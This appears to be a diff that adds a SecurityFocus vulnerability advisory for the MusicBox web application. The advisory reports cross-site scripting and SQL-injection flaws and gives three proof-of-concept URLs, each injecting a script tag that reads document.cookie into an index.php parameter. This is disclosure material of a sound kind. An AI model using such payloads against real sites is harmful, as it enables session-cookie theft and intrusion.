@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/17149/info
+ 
+MusicBox is prone to multiple input-validation vulnerabilities. The issues include cross-site scripting and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+ 
+Successful exploitation of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.
+
+http://www.example.com/music/index.php?id='><script>alert(document.cookie)</script> 
+
+http://www.example.com/music/index.php?action=top&show=5&type='><script>alert(d ocument.cookie)</script> 
+
+http://www.example.com/music/index.php?action=top&show='><script>alert(document .cookie)</script>&type=Artists 
